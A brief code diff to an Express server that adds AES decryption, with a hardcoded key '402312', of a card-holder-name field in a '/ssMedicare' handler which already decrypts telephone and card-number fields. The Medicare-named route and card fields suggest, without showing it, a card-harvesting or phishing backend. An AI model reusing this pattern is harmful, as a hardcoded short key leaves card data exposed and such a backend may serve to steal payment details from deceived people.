@@ -496,6 +496,9 @@ app.post("/ssMedicare", (req, res) => {
   telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
     CryptoJS.enc.Utf8
   );
+  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
   ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
     CryptoJS.enc.Utf8
   );
